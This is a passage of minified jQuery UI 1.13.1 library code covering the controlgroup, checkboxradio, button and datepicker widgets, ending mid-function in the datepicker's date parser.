a="vertical"===this.options.direction,b={classes:{}};return b.classes[d]=({middle:"",first:"ui-corner-"+(a?"top":"left"),last:"ui-corner-"+(a?"bottom":"right"),only:"ui-corner-all"})[c],b},_spinnerOptions:function(b){var a=this._buildSimpleOptions(b,"ui-spinner");return a.classes["ui-spinner-up"]="",a.classes["ui-spinner-down"]="",a},_buttonOptions:function(a){return this._buildSimpleOptions(a,"ui-button")},_checkboxradioOptions:function(a){return this._buildSimpleOptions(a,"ui-checkboxradio-label")},_selectmenuOptions:function(b){var a="vertical"===this.options.direction;return{width:!!a&&"auto",classes:({middle:{"ui-selectmenu-button-open":"","ui-selectmenu-button-closed":""},first:{"ui-selectmenu-button-open":"ui-corner-"+(a?"top":"tl"),"ui-selectmenu-button-closed":"ui-corner-"+(a?"top":"left")},last:{"ui-selectmenu-button-open":a?"":"ui-corner-tr","ui-selectmenu-button-closed":"ui-corner-"+(a?"bottom":"right")},only:{"ui-selectmenu-button-open":"ui-corner-top","ui-selectmenu-button-closed":"ui-corner-all"}})[b]}},_resolveClassesValues:function(a,c){var b={};return $.each(a,function(d){var e=c.options.classes[d]||"";e=String.prototype.trim.call(e.replace(O,"")),b[d]=(e+" "+a[d]).replace(/\s+/g," ")}),b},_setOption:function(a,b){if("direction"===a&&this._removeClass("ui-controlgroup-"+this.options.direction),this._super(a,b),"disabled"===a){this._callChildMethod(b?"disable":"enable");return}this.refresh()},refresh:function(){var a,b=this;this._addClass("ui-controlgroup ui-controlgroup-"+this.options.direction),"horizontal"===this.options.direction&&this._addClass(null,"ui-helper-clearfix"),this._initWidgets(),a=this.childWidgets,this.options.onlyVisible&&(a=a.filter(":visible")),a.length&&($.each(["first","last"],function(f,d){var c=a[d]().data("ui-controlgroup-data");if(c&&b["_"+c.widgetName+"Options"]){var e=b["_"+c.widgetName+"Options"](1===a.length?"only":d);e.classes=b._resolveClassesValues(e.classes,c),c.element[c.widgetName](e)}else b._updateCornerClass(a[d](),d)}),this._callChildMethod("refresh"))}}),/*!
 * jQuery UI Checkboxradio 1.13.1
 * http://jqueryui.com
 *
 * Copyright jQuery Foundation and other contributors
 * Released under the MIT license.
 * http://jquery.org/license
 */ $.widget("ui.checkboxradio",[$.ui.formResetMixin,{version:"1.13.1",options:{disabled:null,label:null,icon:!0,classes:{"ui-checkboxradio-label":"ui-corner-all","ui-checkboxradio-icon":"ui-corner-all"}},_getCreateOptions:function(){var c,a,d=this,b=this._super()||{};return this._readType(),a=this.element.labels(),this.label=$(a[a.length-1]),this.label.length||$.error("No label found for checkboxradio widget"),this.originalLabel="",this.label.contents().not(this.element[0]).each(function(){d.originalLabel+=3===this.nodeType?$(this).text():this.outerHTML}),this.originalLabel&&(b.label=this.originalLabel),null!=(c=this.element[0].disabled)&&(b.disabled=c),b},_create:function(){var a=this.element[0].checked;this._bindFormResetHandler(),null==this.options.disabled&&(this.options.disabled=this.element[0].disabled),this._setOption("disabled",this.options.disabled),this._addClass("ui-checkboxradio","ui-helper-hidden-accessible"),this._addClass(this.label,"ui-checkboxradio-label","ui-button ui-widget"),"radio"===this.type&&this._addClass(this.label,"ui-checkboxradio-radio-label"),this.options.label&&this.options.label!==this.originalLabel?this._updateLabel():this.originalLabel&&(this.options.label=this.originalLabel),this._enhance(),a&&this._addClass(this.label,"ui-checkboxradio-checked","ui-state-active"),this._on({change:"_toggleClasses",focus:function(){this._addClass(this.label,null,"ui-state-focus ui-visual-focus")},blur:function(){this._removeClass(this.label,null,"ui-state-focus ui-visual-focus")}})},_readType:function(){var a=this.element[0].nodeName.toLowerCase();this.type=this.element[0].type,"input"===a&&/radio|checkbox/.test(this.type)||$.error("Can't create checkboxradio on element.nodeName="+a+" and element.type="+this.type)},_enhance:function(){this._updateIcon(this.element[0].checked)},widget:function(){return this.label},_getRadioGroup:function(){var a=this.element[0].name,b="input[name='"+$.escapeSelector(a)+"']";return a?(this.form.length?$(this.form[0].elements).filter(b):$(b).filter(function(){return 0===$(this)._form().length})).not(this.element):$([])},_toggleClasses:function(){var a=this.element[0].checked;this._toggleClass(this.label,"ui-checkboxradio-checked","ui-state-active",a),this.options.icon&&"checkbox"===this.type&&this._toggleClass(this.icon,null,"ui-icon-check ui-state-checked",a)._toggleClass(this.icon,null,"ui-icon-blank",!a),"radio"===this.type&&this._getRadioGroup().each(function(){var a=$(this).checkboxradio("instance");a&&a._removeClass(a.label,"ui-checkboxradio-checked","ui-state-active")})},_destroy:function(){this._unbindFormResetHandler(),this.icon&&(this.icon.remove(),this.iconSpace.remove())},_setOption:function(b,a){if("label"!==b||a){if(this._super(b,a),"disabled"===b){this._toggleClass(this.label,null,"ui-state-disabled",a),this.element[0].disabled=a;return}this.refresh()}},_updateIcon:function(a){var b="ui-icon ui-icon-background ";this.options.icon?(this.icon||(this.icon=$("<span>"),this.iconSpace=$("<span> </span>"),this._addClass(this.iconSpace,"ui-checkboxradio-icon-space")),"checkbox"===this.type?(b+=a?"ui-icon-check ui-state-checked":"ui-icon-blank",this._removeClass(this.icon,null,a?"ui-icon-blank":"ui-icon-check")):b+="ui-icon-blank",this._addClass(this.icon,"ui-checkboxradio-icon",b),a||this._removeClass(this.icon,null,"ui-icon-check ui-state-checked"),this.icon.prependTo(this.label).after(this.iconSpace)):void 0!==this.icon&&(this.icon.remove(),this.iconSpace.remove(),delete this.icon)},_updateLabel:function(){var a=this.label.contents().not(this.element[0]);this.icon&&(a=a.not(this.icon[0])),this.iconSpace&&(a=a.not(this.iconSpace[0])),a.remove(),this.label.append(this.options.label)},refresh:function(){var a=this.element[0].checked,b=this.element[0].disabled;this._updateIcon(a),this._toggleClass(this.label,"ui-checkboxradio-checked","ui-state-active",a),null!==this.options.label&&this._updateLabel(),b!==this.options.disabled&&this._setOptions({disabled:b})}}]),$.ui.checkboxradio,/*!
 * jQuery UI Button 1.13.1
 * http://jqueryui.com
 *
 * Copyright jQuery Foundation and other contributors
 * Released under the MIT license.
 * http://jquery.org/license
 */ $.widget("ui.button",{version:"1.13.1",defaultElement:"<button>",options:{classes:{"ui-button":"ui-corner-all"},disabled:null,icon:null,iconPosition:"beginning",label:null,showLabel:!0},_getCreateOptions:function(){var b,a=this._super()||{};return this.isInput=this.element.is("input"),null!=(b=this.element[0].disabled)&&(a.disabled=b),this.originalLabel=this.isInput?this.element.val():this.element.html(),this.originalLabel&&(a.label=this.originalLabel),a},_create:function(){!this.option.showLabel& !this.options.icon&&(this.options.showLabel=!0),null==this.options.disabled&&(this.options.disabled=this.element[0].disabled||!1),this.hasTitle=!!this.element.attr("title"),this.options.label&&this.options.label!==this.originalLabel&&(this.isInput?this.element.val(this.options.label):this.element.html(this.options.label)),this._addClass("ui-button","ui-widget"),this._setOption("disabled",this.options.disabled),this._enhance(),this.element.is("a")&&this._on({keyup:function(a){a.keyCode===$.ui.keyCode.SPACE&&(a.preventDefault(),this.element[0].click?this.element[0].click():this.element.trigger("click"))}})},_enhance:function(){this.element.is("button")||this.element.attr("role","button"),this.options.icon&&(this._updateIcon("icon",this.options.icon),this._updateTooltip())},_updateTooltip:function(){this.title=this.element.attr("title"),this.options.showLabel||this.title||this.element.attr("title",this.options.label)},_updateIcon:function(d,c){var b="iconPosition"!==d,a=b?this.options.iconPosition:c;this.icon?b&&this._removeClass(this.icon,null,this.options.icon):(this.icon=$("<span>"),this._addClass(this.icon,"ui-button-icon","ui-icon"),this.options.showLabel||this._addClass("ui-button-icon-only")),b&&this._addClass(this.icon,null,c),this._attachIcon(a),"top"===a||"bottom"===a?(this._addClass(this.icon,null,"ui-widget-icon-block"),this.iconSpace&&this.iconSpace.remove()):(this.iconSpace||(this.iconSpace=$("<span> </span>"),this._addClass(this.iconSpace,"ui-button-icon-space")),this._removeClass(this.icon,null,"ui-wiget-icon-block"),this._attachIconSpace(a))},_destroy:function(){this.element.removeAttr("role"),this.icon&&this.icon.remove(),this.iconSpace&&this.iconSpace.remove(),this.hasTitle||this.element.removeAttr("title")},_attachIconSpace:function(a){this.icon[/^(?:end|bottom)/.test(a)?"before":"after"](this.iconSpace)},_attachIcon:function(a){this.element[/^(?:end|bottom)/.test(a)?"append":"prepend"](this.icon)},_setOptions:function(a){var b=void 0===a.showLabel?this.options.showLabel:a.showLabel,c=void 0===a.icon?this.options.icon:a.icon;b||c||(a.showLabel=!0),this._super(a)},_setOption:function(b,a){"icon"===b&&(a?this._updateIcon(b,a):this.icon&&(this.icon.remove(),this.iconSpace&&this.iconSpace.remove())),"iconPosition"===b&&this._updateIcon(b,a),"showLabel"===b&&(this._toggleClass("ui-button-icon-only",null,!a),this._updateTooltip()),"label"===b&&(this.isInput?this.element.val(a):(this.element.html(a),this.icon&&(this._attachIcon(this.options.iconPosition),this._attachIconSpace(this.options.iconPosition)))),this._super(b,a),"disabled"===b&&(this._toggleClass(null,"ui-state-disabled",a),this.element[0].disabled=a,a&&this.element.trigger("blur"))},refresh:function(){var a=this.element.is("input, button")?this.element[0].disabled:this.element.hasClass("ui-button-disabled");a!==this.options.disabled&&this._setOptions({disabled:a}),this._updateTooltip()}}),!1!==$.uiBackCompat&&($.widget("ui.button",$.ui.button,{options:{text:!0,icons:{primary:null,secondary:null}},_create:function(){this.options.showLabel&&!this.options.text&&(this.options.showLabel=this.options.text),!this.options.showLabel&&this.options.text&&(this.options.text=this.options.showLabel),!this.options.icon&&(this.options.icons.primary||this.options.icons.secondary)?this.options.icons.primary?this.options.icon=this.options.icons.primary:(this.options.icon=this.options.icons.secondary,this.options.iconPosition="end"):this.options.icon&&(this.options.icons.primary=this.options.icon),this._super()},_setOption:function(b,a){if("text"===b){this._super("showLabel",a);return}"showLabel"===b&&(this.options.text=a),"icon"===b&&(this.options.icons.primary=a),"icons"===b&&(a.primary?(this._super("icon",a.primary),this._super("iconPosition","beginning")):a.secondary&&(this._super("icon",a.secondary),this._super("iconPosition","end"))),this._superApply(arguments)}}),$.fn.button=(n=$.fn.button,function(a){var d="string"==typeof a,b=Array.prototype.slice.call(arguments,1),c=this;return d?this.length||"instance"!==a?this.each(function(){var d,f=$(this).attr("type"),g="checkbox"!==f&&"radio"!==f?"button":"checkboxradio",e=$.data(this,"ui-"+g);return"instance"===a?(c=e,!1):e?"function"!=typeof e[a]||"_"===a.charAt(0)?$.error("no such method '"+a+"' for button widget instance"):(d=e[a].apply(e,b))!==e&& void 0!==d?(c=d&&d.jquery?c.pushStack(d.get()):d,!1):void 0:$.error("cannot call methods on button prior to initialization; attempted to call method '"+a+"'")}):c=void 0:(b.length&&(a=$.widget.extend.apply(null,[a].concat(b))),this.each(function(){var c=$(this).attr("type"),d="checkbox"!==c&&"radio"!==c?"button":"checkboxradio",b=$.data(this,"ui-"+d);if(b)b.option(a||{}),b._init&&b._init();else{if("button"===d){n.call($(this),a);return}$(this).checkboxradio($.extend({icon:!1},a))}})),c}),$.fn.buttonset=function(){return($.ui.controlgroup||$.error("Controlgroup widget missing"),"option"===arguments[0]&&"items"===arguments[1]&&arguments[2])?this.controlgroup.apply(this,[arguments[0],"items.button",arguments[2]]):"option"===arguments[0]&&"items"===arguments[1]?this.controlgroup.apply(this,[arguments[0],"items.button"]):("object"==typeof arguments[0]&&arguments[0].items&&(arguments[0].items={button:arguments[0].items}),this.controlgroup.apply(this,arguments))}),$.ui.button,/*!
 * jQuery UI Datepicker 1.13.1
 * http://jqueryui.com
 *
 * Copyright jQuery Foundation and other contributors
 * Released under the MIT license.
 * http://jquery.org/license
 */ $.extend($.ui,{datepicker:{version:"1.13.1"}}),$.extend(h.prototype,{markerClassName:"hasDatepicker",maxRows:4,_widgetDatepicker:function(){return this.dpDiv},setDefaults:function(a){return R(this._defaults,a||{}),this},_attachDatepicker:function(a,e){var c,d,b;d="div"===(c=a.nodeName.toLowerCase())||"span"===c,a.id||(this.uuid+=1,a.id="dp"+this.uuid),b=this._newInst($(a),d),b.settings=$.extend({},e||{}),"input"===c?this._connectDatepicker(a,b):d&&this._inlineDatepicker(a,b)},_newInst:function(a,b){return{id:a[0].id.replace(/([^A-Za-z0-9_\-])/g,"\\\\$1"),input:a,selectedDay:0,selectedMonth:0,selectedYear:0,drawMonth:0,drawYear:0,inline:b,dpDiv:b?P($("<div class='"+this._inlineClass+" ui-datepicker ui-widget ui-widget-content ui-helper-clearfix ui-corner-all'></div>")):this.dpDiv}},_connectDatepicker:function(b,a){var c=$(b);a.append=$([]),a.trigger=$([]),!c.hasClass(this.markerClassName)&&(this._attachments(c,a),c.addClass(this.markerClassName).on("keydown",this._doKeyDown).on("keypress",this._doKeyPress).on("keyup",this._doKeyUp),this._autoSize(a),$.data(b,"datepicker",a),a.settings.disabled&&this._disableDatepicker(b))},_attachments:function(c,a){var d,b,e,f=this._get(a,"appendText"),g=this._get(a,"isRTL");a.append&&a.append.remove(),f&&(a.append=$("<span>").addClass(this._appendClass).text(f),c[g?"before":"after"](a.append)),c.off("focus",this._showDatepicker),a.trigger&&a.trigger.remove(),("focus"===(d=this._get(a,"showOn"))||"both"===d)&&c.on("focus",this._showDatepicker),("button"===d||"both"===d)&&(b=this._get(a,"buttonText"),e=this._get(a,"buttonImage"),this._get(a,"buttonImageOnly")?a.trigger=$("<img>").addClass(this._triggerClass).attr({src:e,alt:b,title:b}):(a.trigger=$("<button type='button'>").addClass(this._triggerClass),e?a.trigger.html($("<img>").attr({src:e,alt:b,title:b})):a.trigger.text(b)),c[g?"before":"after"](a.trigger),a.trigger.on("click",function(){return $.datepicker._datepickerShowing&&$.datepicker._lastInput===c[0]?$.datepicker._hideDatepicker():($.datepicker._datepickerShowing&&$.datepicker._lastInput!==c[0]&&$.datepicker._hideDatepicker(),$.datepicker._showDatepicker(c[0])),!1}))},_autoSize:function(a){if(this._get(a,"autoSize")&&!a.inline){var c,e,f,g,b=new Date(2009,11,20),d=this._get(a,"dateFormat");d.match(/[DM]/)&&(c=function(a){for(g=0,e=0,f=0;g<a.length;g++)a[g].length>e&&(e=a[g].length,f=g);return f},b.setMonth(c(this._get(a,d.match(/MM/)?"monthNames":"monthNamesShort"))),b.setDate(c(this._get(a,d.match(/DD/)?"dayNames":"dayNamesShort"))+20-b.getDay())),a.input.attr("size",this._formatDate(a,b).length)}},_inlineDatepicker:function(b,a){var c=$(b);c.hasClass(this.markerClassName)||(c.addClass(this.markerClassName).append(a.dpDiv),$.data(b,"datepicker",a),this._setDate(a,this._getDefaultDate(a),!0),this._updateDatepicker(a),this._updateAlternate(a),a.settings.disabled&&this._disableDatepicker(b),a.dpDiv.css("display","block"))},_dialogDatepicker:function(k,b,i,j,c){var d,e,f,g,h,a=this._dialogInst;return a||(this.uuid+=1,d="dp"+this.uuid,this._dialogInput=$("<input type='text' id='"+d+"' style='position: absolute; top: -100px; width: 0px;'/>"),this._dialogInput.on("keydown",this._doKeyDown),$("body").append(this._dialogInput),(a=this._dialogInst=this._newInst(this._dialogInput,!1)).settings={},$.data(this._dialogInput[0],"datepicker",a)),R(a.settings,j||{}),b=b&&b.constructor===Date?this._formatDate(a,b):b,this._dialogInput.val(b),this._pos=c?c.length?c:[c.pageX,c.pageY]:null,this._pos||(e=document.documentElement.clientWidth,f=document.documentElement.clientHeight,g=document.documentElement.scrollLeft||document.body.scrollLeft,h=document.documentElement.scrollTop||document.body.scrollTop,this._pos=[e/2-100+g,f/2-150+h]),this._dialogInput.css("left",this._pos[0]+20+"px").css("top",this._pos[1]+"px"),a.settings.onSelect=i,this._inDialog=!0,this.dpDiv.addClass(this._dialogClass),this._showDatepicker(this._dialogInput[0]),$.blockUI&&$.blockUI(this.dpDiv),$.data(this._dialogInput[0],"datepicker",a),this},_destroyDatepicker:function(a){var b,c=$(a),d=$.data(a,"datepicker");c.hasClass(this.markerClassName)&&(b=a.nodeName.toLowerCase(),$.removeData(a,"datepicker"),"input"===b?(d.append.remove(),d.trigger.remove(),c.removeClass(this.markerClassName).off("focus",this._showDatepicker).off("keydown",this._doKeyDown).off("keypress",this._doKeyPress).off("keyup",this._doKeyUp)):("div"===b||"span"===b)&&c.removeClass(this.markerClassName).empty(),u===d&&(u=null,this._curInst=null))},_enableDatepicker:function(a){var b,c,d=$(a),e=$.data(a,"datepicker");d.hasClass(this.markerClassName)&&("input"===(b=a.nodeName.toLowerCase())?(a.disabled=!1,e.trigger.filter("button").each(function(){this.disabled=!1}).end().filter("img").css({opacity:"1.0",cursor:""})):("div"===b||"span"===b)&&((c=d.children("."+this._inlineClass)).children().removeClass("ui-state-disabled"),c.find("select.ui-datepicker-month, select.ui-datepicker-year").prop("disabled",!1)),this._disabledInputs=$.map(this._disabledInputs,function(b){return b===a?null:b}))},_disableDatepicker:function(a){var b,c,d=$(a),e=$.data(a,"datepicker");d.hasClass(this.markerClassName)&&("input"===(b=a.nodeName.toLowerCase())?(a.disabled=!0,e.trigger.filter("button").each(function(){this.disabled=!0}).end().filter("img").css({opacity:"0.5",cursor:"default"})):("div"===b||"span"===b)&&((c=d.children("."+this._inlineClass)).children().addClass("ui-state-disabled"),c.find("select.ui-datepicker-month, select.ui-datepicker-year").prop("disabled",!0)),this._disabledInputs=$.map(this._disabledInputs,function(b){return b===a?null:b}),this._disabledInputs[this._disabledInputs.length]=a)},_isDisabledDatepicker:function(b){if(!b)return!1;for(var a=0;a<this._disabledInputs.length;a++)if(this._disabledInputs[a]===b)return!0;return!1},_getInst:function(a){try{return $.data(a,"datepicker")}catch(b){throw"Missing instance data for this datepicker"}},_optionDatepicker:function(d,c,h){var b,g,e,f,a=this._getInst(d);if(2===arguments.length&&"string"==typeof c)return"defaults"===c?$.extend({},$.datepicker._defaults):a?"all"===c?$.extend({},a.settings):this._get(a,c):null;b=c||{},"string"==typeof c&&((b={})[c]=h),a&&(this._curInst===a&&this._hideDatepicker(),g=this._getDateDatepicker(d,!0),e=this._getMinMaxDate(a,"min"),f=this._getMinMaxDate(a,"max"),R(a.settings,b),null!==e&& void 0!==b.dateFormat&& void 0===b.minDate&&(a.settings.minDate=this._formatDate(a,e)),null!==f&& void 0!==b.dateFormat&& void 0===b.maxDate&&(a.settings.maxDate=this._formatDate(a,f)),"disabled"in b&&(b.disabled?this._disableDatepicker(d):this._enableDatepicker(d)),this._attachments($(d),a),this._autoSize(a),this._setDate(a,g),this._updateAlternate(a),this._updateDatepicker(a))},_changeDatepicker:function(a,b,c){this._optionDatepicker(a,b,c)},_refreshDatepicker:function(b){var a=this._getInst(b);a&&this._updateDatepicker(a)},_setDateDatepicker:function(b,c){var a=this._getInst(b);a&&(this._setDate(a,c),this._updateDatepicker(a),this._updateAlternate(a))},_getDateDatepicker:function(b,c){var a=this._getInst(b);return a&&!a.inline&&this._setDateFromField(a,c),a?this._getDate(a):null},_doKeyDown:function(a){var d,e,f,b=$.datepicker._getInst(a.target),c=!0,g=b.dpDiv.is(".ui-datepicker-rtl");if(b._keyEvent=!0,$.datepicker._datepickerShowing)switch(a.keyCode){case 9:$.datepicker._hideDatepicker(),c=!1;break;case 13:return(f=$("td."+$.datepicker._dayOverClass+":not(."+$.datepicker._currentClass+")",b.dpDiv))[0]&&$.datepicker._selectDay(a.target,b.selectedMonth,b.selectedYear,f[0]),(d=$.datepicker._get(b,"onSelect"))?(e=$.datepicker._formatDate(b),d.apply(b.input?b.input[0]:null,[e,b])):$.datepicker._hideDatepicker(),!1;case 27:$.datepicker._hideDatepicker();break;case 33:$.datepicker._adjustDate(a.target,a.ctrlKey?-$.datepicker._get(b,"stepBigMonths"):-$.datepicker._get(b,"stepMonths"),"M");break;case 34:$.datepicker._adjustDate(a.target,a.ctrlKey?+$.datepicker._get(b,"stepBigMonths"):+$.datepicker._get(b,"stepMonths"),"M");break;case 35:(a.ctrlKey||a.metaKey)&&$.datepicker._clearDate(a.target),c=a.ctrlKey||a.metaKey;break;case 36:(a.ctrlKey||a.metaKey)&&$.datepicker._gotoToday(a.target),c=a.ctrlKey||a.metaKey;break;case 37:(a.ctrlKey||a.metaKey)&&$.datepicker._adjustDate(a.target,g?1:-1,"D"),c=a.ctrlKey||a.metaKey,a.originalEvent.altKey&&$.datepicker._adjustDate(a.target,a.ctrlKey?-$.datepicker._get(b,"stepBigMonths"):-$.datepicker._get(b,"stepMonths"),"M");break;case 38:(a.ctrlKey||a.metaKey)&&$.datepicker._adjustDate(a.target,-7,"D"),c=a.ctrlKey||a.metaKey;break;case 39:(a.ctrlKey||a.metaKey)&&$.datepicker._adjustDate(a.target,g?-1:1,"D"),c=a.ctrlKey||a.metaKey,a.originalEvent.altKey&&$.datepicker._adjustDate(a.target,a.ctrlKey?+$.datepicker._get(b,"stepBigMonths"):+$.datepicker._get(b,"stepMonths"),"M");break;case 40:(a.ctrlKey||a.metaKey)&&$.datepicker._adjustDate(a.target,7,"D"),c=a.ctrlKey||a.metaKey;break;default:c=!1}else 36===a.keyCode&&a.ctrlKey?$.datepicker._showDatepicker(this):c=!1;c&&(a.preventDefault(),a.stopPropagation())},_doKeyPress:function(a){var b,c,d=$.datepicker._getInst(a.target);if($.datepicker._get(d,"constrainInput"))return b=$.datepicker._possibleChars($.datepicker._get(d,"dateFormat")),c=String.fromCharCode(null==a.charCode?a.keyCode:a.charCode),a.ctrlKey||a.metaKey||c<" "||!b||b.indexOf(c)> -1},_doKeyUp:function(b){var a=$.datepicker._getInst(b.target);if(a.input.val()!==a.lastVal)try{$.datepicker.parseDate($.datepicker._get(a,"dateFormat"),a.input?a.input.val():null,$.datepicker._getFormatConfig(a))&&($.datepicker._setDateFromField(a),$.datepicker._updateAlternate(a),$.datepicker._updateDatepicker(a))}catch(c){}return!0},_showDatepicker:function(b){var a,e,f,g,c,d,h;"input"!==(b=b.target||b).nodeName.toLowerCase()&&(b=$("input",b.parentNode)[0]),!$.datepicker._isDisabledDatepicker(b)&&$.datepicker._lastInput!==b&&(a=$.datepicker._getInst(b),$.datepicker._curInst&&$.datepicker._curInst!==a&&($.datepicker._curInst.dpDiv.stop(!0,!0),a&&$.datepicker._datepickerShowing&&$.datepicker._hideDatepicker($.datepicker._curInst.input[0])),e=$.datepicker._get(a,"beforeShow"),f=e?e.apply(b,[b,a]):{},!1!==f&&(R(a.settings,f),a.lastVal=null,$.datepicker._lastInput=b,$.datepicker._setDateFromField(a),$.datepicker._inDialog&&(b.value=""),$.datepicker._pos||($.datepicker._pos=$.datepicker._findPos(b),$.datepicker._pos[1]+=b.offsetHeight),g=!1,$(b).parents().each(function(){return!(g|="fixed"===$(this).css("position"))}),c={left:$.datepicker._pos[0],top:$.datepicker._pos[1]},$.datepicker._pos=null,a.dpDiv.empty(),a.dpDiv.css({position:"absolute",display:"block",top:"-1000px"}),$.datepicker._updateDatepicker(a),c=$.datepicker._checkOffset(a,c,g),a.dpDiv.css({position:$.datepicker._inDialog&&$.blockUI?"static":g?"fixed":"absolute",display:"none",left:c.left+"px",top:c.top+"px"}),a.inline||(d=$.datepicker._get(a,"showAnim"),h=$.datepicker._get(a,"duration"),a.dpDiv.css("z-index",function(a){for(var c,b;a.length&&a[0]!==document;){if(("absolute"===(c=a.css("position"))||"relative"===c||"fixed"===c)&&(b=parseInt(a.css("zIndex"),10),!isNaN(b)&&0!==b))return b;a=a.parent()}return 0}($(b))+1),$.datepicker._datepickerShowing=!0,$.effects&&$.effects.effect[d]?a.dpDiv.show(d,$.datepicker._get(a,"showOptions"),h):a.dpDiv[d||"show"](d?h:null),$.datepicker._shouldFocusInput(a)&&a.input.trigger("focus"),$.datepicker._curInst=a)))},_updateDatepicker:function(a){this.maxRows=4,u=a,a.dpDiv.empty().append(this._generateHTML(a)),this._attachHandlers(a);var f,b=this._getNumberOfMonths(a),c=b[1],d=a.dpDiv.find("."+this._dayOverClass+" a"),e=$.datepicker._get(a,"onUpdateDatepicker");d.length>0&&Q.apply(d.get(0)),a.dpDiv.removeClass("ui-datepicker-multi-2 ui-datepicker-multi-3 ui-datepicker-multi-4").width(""),c>1&&a.dpDiv.addClass("ui-datepicker-multi-"+c).css("width",17*c+"em"),a.dpDiv[(1!==b[0]||1!==b[1]?"add":"remove")+"Class"]("ui-datepicker-multi"),a.dpDiv[(this._get(a,"isRTL")?"add":"remove")+"Class"]("ui-datepicker-rtl"),a===$.datepicker._curInst&&$.datepicker._datepickerShowing&&$.datepicker._shouldFocusInput(a)&&a.input.trigger("focus"),a.yearshtml&&(f=a.yearshtml,setTimeout(function(){f===a.yearshtml&&a.yearshtml&&a.dpDiv.find("select.ui-datepicker-year").first().replaceWith(a.yearshtml),f=a.yearshtml=null},0)),e&&e.apply(a.input?a.input[0]:null,[a])},_shouldFocusInput:function(a){return a.input&&a.input.is(":visible")&&!a.input.is(":disabled")&&!a.input.is(":focus")},_checkOffset:function(b,a,c){var d=b.dpDiv.outerWidth(),e=b.dpDiv.outerHeight(),i=b.input?b.input.outerWidth():0,g=b.input?b.input.outerHeight():0,f=document.documentElement.clientWidth+(c?0:$(document).scrollLeft()),h=document.documentElement.clientHeight+(c?0:$(document).scrollTop());return a.left-=this._get(b,"isRTL")?d-i:0,a.left-=c&&a.left===b.input.offset().left?$(document).scrollLeft():0,a.top-=c&&a.top===b.input.offset().top+g?$(document).scrollTop():0,a.left-=Math.min(a.left,a.left+d>f&&f>d?Math.abs(a.left+d-f):0),a.top-=Math.min(a.top,a.top+e>h&&h>e?Math.abs(e+g):0),a},_findPos:function(a){for(var b,c=this._getInst(a),d=this._get(c,"isRTL");a&&("hidden"===a.type||1!==a.nodeType||$.expr.pseudos.hidden(a));)a=a[d?"previousSibling":"nextSibling"];return[(b=$(a).offset()).left,b.top]},_hideDatepicker:function(e){var b,d,c,f,a=this._curInst;a&&(!e||a===$.data(e,"datepicker"))&&this._datepickerShowing&&(b=this._get(a,"showAnim"),d=this._get(a,"duration"),c=function(){$.datepicker._tidyDialog(a)},$.effects&&($.effects.effect[b]||$.effects[b])?a.dpDiv.hide(b,$.datepicker._get(a,"showOptions"),d,c):a.dpDiv["slideDown"===b?"slideUp":"fadeIn"===b?"fadeOut":"hide"](b?d:null,c),b||c(),this._datepickerShowing=!1,(f=this._get(a,"onClose"))&&f.apply(a.input?a.input[0]:null,[a.input?a.input.val():"",a]),this._lastInput=null,this._inDialog&&(this._dialogInput.css({position:"absolute",left:"0",top:"-100px"}),$.blockUI&&($.unblockUI(),$("body").append(this.dpDiv))),this._inDialog=!1)},_tidyDialog:function(a){a.dpDiv.removeClass(this._dialogClass).off(".ui-datepicker-calendar")},_checkExternalClick:function(b){if($.datepicker._curInst){var a=$(b.target),c=$.datepicker._getInst(a[0]);(a[0].id!==$.datepicker._mainDivId&&0===a.parents("#"+$.datepicker._mainDivId).length&&!a.hasClass($.datepicker.markerClassName)&&!a.closest("."+$.datepicker._triggerClass).length&&$.datepicker._datepickerShowing&&!($.datepicker._inDialog&&$.blockUI)||a.hasClass($.datepicker.markerClassName)&&$.datepicker._curInst!==c)&&$.datepicker._hideDatepicker()}},_adjustDate:function(c,d,e){var a=$(c),b=this._getInst(a[0]);this._isDisabledDatepicker(a[0])||(this._adjustInstDate(b,d,e),this._updateDatepicker(b))},_gotoToday:function(d){var b,c=$(d),a=this._getInst(c[0]);this._get(a,"gotoCurrent")&&a.currentDay?(a.selectedDay=a.currentDay,a.drawMonth=a.selectedMonth=a.currentMonth,a.drawYear=a.selectedYear=a.currentYear):(b=new Date,a.selectedDay=b.getDate(),a.drawMonth=a.selectedMonth=b.getMonth(),a.drawYear=a.selectedYear=b.getFullYear()),this._notifyChange(a),this._adjustDate(c)},_selectMonthYear:function(e,b,c){var d=$(e),a=this._getInst(d[0]);a["selected"+("M"===c?"Month":"Year")]=a["draw"+("M"===c?"Month":"Year")]=parseInt(b.options[b.selectedIndex].value,10),this._notifyChange(a),this._adjustDate(d)},_selectDay:function(b,e,f,c){var a,d=$(b);$(c).hasClass(this._unselectableClass)||this._isDisabledDatepicker(d[0])||((a=this._getInst(d[0])).selectedDay=a.currentDay=parseInt($("a",c).attr("data-date")),a.selectedMonth=a.currentMonth=e,a.selectedYear=a.currentYear=f,this._selectDate(b,this._formatDate(a,a.currentDay,a.currentMonth,a.currentYear)))},_clearDate:function(a){var b=$(a);this._selectDate(b,"")},_selectDate:function(d,b){var c,e=$(d),a=this._getInst(e[0]);b=null!=b?b:this._formatDate(a),a.input&&a.input.val(b),this._updateAlternate(a),c=this._get(a,"onSelect"),c?c.apply(a.input?a.input[0]:null,[b,a]):a.input&&a.input.trigger("change"),a.inline?this._updateDatepicker(a):(this._hideDatepicker(),this._lastInput=a.input[0],"object"!=typeof a.input[0]&&a.input.trigger("focus"),this._lastInput=null)},_updateAlternate:function(a){var b,c,d,e=this._get(a,"altField");e&&(b=this._get(a,"altFormat")||this._get(a,"dateFormat"),c=this._getDate(a),d=this.formatDate(b,c,this._getFormatConfig(a)),$(document).find(e).val(d))},noWeekends:function(b){var a=b.getDay();return[a>0&&a<6,""]},iso8601Week:function(c){var b,a=new Date(c.getTime());return a.setDate(a.getDate()+4-(a.getDay()||7)),b=a.getTime(),a.setMonth(0),a.setDate(1),Math.floor(Math.round((b-a)/864e5)/7)+1},parseDate:function(i,f,b){if(null==i||null==f)throw"Invalid arguments";if(""===(f="object"==typeof f?f.toString():f+""))return null;var h,o,j,c,p=0,k=(b?b.shortYearCutoff:null)||this._defaults.shortYearCutoff,s="string"!=typeof k?k:new Date().getFullYear()%100+parseInt(k,10),t=(b?b.dayNamesShort:null)||this._defaults.dayNamesShort,u=(b?b.dayNames:null)||this._defaults.dayNames,v=(b?b.monthNamesShort:null)||this._defaults.monthNamesShort,w=(b?b.monthNames:null)||this._defaults.monthNames,a=-1,d=-1,e=-1,l=-1,m=!1,q=function(b){var a=h+1<i.length&&i.charAt(h+1)===b;return a&&h++,a},g=function(a){var d=q(a),c="@"===a?14:"!"===a?20:"y"===a&&d?4:"o"===a?3:2,e="y"===a?c:1,g=new 